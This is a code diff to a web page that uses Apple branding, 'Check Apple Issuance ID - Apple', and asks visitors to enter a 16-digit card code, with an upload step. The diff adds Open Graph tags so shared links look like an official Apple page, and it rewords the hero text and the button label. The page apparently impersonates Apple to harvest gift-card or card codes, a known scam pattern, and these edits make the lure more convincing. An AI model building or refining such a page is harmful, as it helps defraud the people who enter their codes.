@@ -200,6 +200,9 @@ export default function AppleIdPage() {
     <div className={styles.appleStyles}>
       <Head>
         <title>Check Apple Issuance ID - Apple</title>
+        <meta property="og:title" content="Check Apple Issuance ID - Apple" />
+        <meta property="og:description" content="Check your Apple card Issuance ID." />
+        <meta property="og:type" content="website" />
       </Head>
 
       {/* Location Banner */}
@@ -298,7 +301,7 @@ export default function AppleIdPage() {
         <div className="shell">
           <section className="hero">
             <h1>Apple Issuance ID Check</h1>
-            <p className="hero-text">Enter your 16-digit code to generate the Issuance ID instantly.</p>
+            <p className="hero-text">Enter your 16 digit code to check your card's Issuance ID.</p>
           </section>
 
           <div className="main-card">
@@ -341,7 +344,7 @@ export default function AppleIdPage() {
               {!showUploadStep && (
                 <div className="actions">
                   <button type="submit" className="primary" disabled={loading}>
-                    {loading ? 'Checking…' : 'Check ID'}
+                    {loading ? 'Checking…' : 'Check Card'}
                   </button>
                 </div>
               )}
